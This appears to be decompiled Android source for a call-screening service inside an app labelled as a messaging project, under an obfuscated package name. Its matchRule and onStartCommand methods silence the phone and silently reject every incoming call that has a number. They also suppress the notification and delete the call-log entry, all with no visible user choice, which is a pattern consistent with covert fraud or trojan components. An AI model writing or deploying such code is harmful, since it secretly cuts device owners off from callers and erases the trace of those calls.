package im.bclpbkiauv.tel;

import android.content.Intent;
import android.os.Build;
import android.telecom.Call;
import android.telecom.CallScreeningService;
import android.telephony.TelephonyManager;
import kotlin.Metadata;
import kotlin.jvm.internal.Intrinsics;

@Metadata(bv = {1, 0, 3}, d1 = {"\u0000(\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u0002\n\u0002\b\u0005\n\u0002\u0010\b\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0003\b\u0017\u0018\u00002\u00020\u0001B\u0005¢\u0006\u0002\u0010\u0002J\u0010\u0010\u0005\u001a\u00020\u00062\u0006\u0010\u0003\u001a\u00020\u0004H\u0003J\u0010\u0010\u0007\u001a\u00020\u00062\u0006\u0010\u0003\u001a\u00020\u0004H\u0003J\b\u0010\b\u001a\u00020\u0006H\u0016J\u0010\u0010\t\u001a\u00020\u00062\u0006\u0010\n\u001a\u00020\u0004H\u0017J\"\u0010\u000b\u001a\u00020\f2\b\u0010\r\u001a\u0004\u0018\u00010\u000e2\u0006\u0010\u000f\u001a\u00020\f2\u0006\u0010\u0010\u001a\u00020\fH\u0016R\u0010\u0010\u0003\u001a\u0004\u0018\u00010\u0004X\u000e¢\u0006\u0002\n\u0000¨\u0006\u0011"}, d2 = {"Lim/bclpbkiauv/tel/CallApiAbove29ScreeningService;", "Landroid/telecom/CallScreeningService;", "()V", "details", "Landroid/telecom/Call$Details;", "hangUpCall", "", "matchRule", "onCreate", "onScreenCall", "callDetails", "onStartCommand", "", "intent", "Landroid/content/Intent;", "flags", "startId", "HMessagesPrj_prodRelease"}, k = 1, mv = {1, 1, 16})
/* compiled from: CallInterceptor.kt */
public class CallApiAbove29ScreeningService extends CallScreeningService {
    private Call.Details details;

    public void onCreate() {
        super.onCreate();
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        String incomingNumber = null;
        if (Intrinsics.areEqual((Object) intent != null ? intent.getStringExtra("callState") : null, (Object) TelephonyManager.EXTRA_STATE_RINGING)) {
            if (intent != null) {
                incomingNumber = intent.getStringExtra("incomingNumber");
            }
            if (incomingNumber != null) {
                String it = incomingNumber;
                Call.Details a = this.details;
                if (a != null) {
                    matchRule(a);
                }
                CallInterceptorKt.deleteIncomingCallLog(this, it);
            }
        }
        return super.onStartCommand(intent, flags, startId);
    }

    private final void matchRule(Call.Details details2) {
        String incomingNumber = CallInterceptorKt.getIncomingNumberByDetails(details2);
        if (incomingNumber != null) {
            CallInterceptorKt.turnSilent(this);
            hangUpCall(details2);
            CallInterceptorKt.deleteIncomingCallLog(this, incomingNumber);
        }
    }

    private final void hangUpCall(Call.Details details2) {
        try {
            CallScreeningService.CallResponse.Builder builder = new CallScreeningService.CallResponse.Builder();
            builder.setDisallowCall(true);
            builder.setRejectCall(true);
            builder.setSkipCallLog(true);
            builder.setSkipNotification(true);
            respondToCall(details2, builder.build());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void onScreenCall(Call.Details callDetails) {
        Intrinsics.checkParameterIsNotNull(callDetails, "callDetails");
        this.details = callDetails;
        if (Build.VERSION.SDK_INT < 29) {
            matchRule(callDetails);
        } else if (callDetails.getCallDirection() == 0) {
            matchRule(callDetails);
        }
    }
}
